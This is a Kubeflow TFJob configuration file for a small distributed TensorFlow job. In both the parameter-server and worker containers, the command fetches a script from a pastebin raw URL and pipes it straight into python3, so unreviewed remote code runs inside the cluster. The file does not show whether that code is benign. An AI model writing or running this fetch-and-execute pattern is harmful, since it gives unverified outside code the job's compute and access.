apiVersion: kubeflow.org/v1
kind: TFJob
metadata:
  name: job2
spec:
  min-instances: 1
  max-instances: 3
  # cleanPodPolicy: "All"
  cleanPodPolicy: "None"
  tfReplicaSpecs:
    PS:
      replicas: 1
      restartPolicy: OnFailure
      template:
        spec:
          terminationGracePeriodSeconds: 0
          containers:
          - name: tensorflow
            image: tensorflow/tensorflow:1.15.0-py3
            command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/jxCQUNbU | python3 -"]
            ports:
            - containerPort: 2222
              name: tfjob-port
            resources:
              # limits:
              requests:
                cpu: "1000m"
                memory: "1Gi"
    Worker:
      replicas: 1
      restartPolicy: OnFailure
      template:
        spec:
          terminationGracePeriodSeconds: 0
          containers:
          - name: tensorflow
            image: tensorflow/tensorflow:1.15.0-py3
            command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/jxCQUNbU | python3 -"]
            env:
            - name: "global_steps"
              value: "3000"
            ports:
            - containerPort: 2222
              name: tfjob-port
            resources:
              # limits:
              requests:
                cpu: "1000m"
                memory: "1Gi"
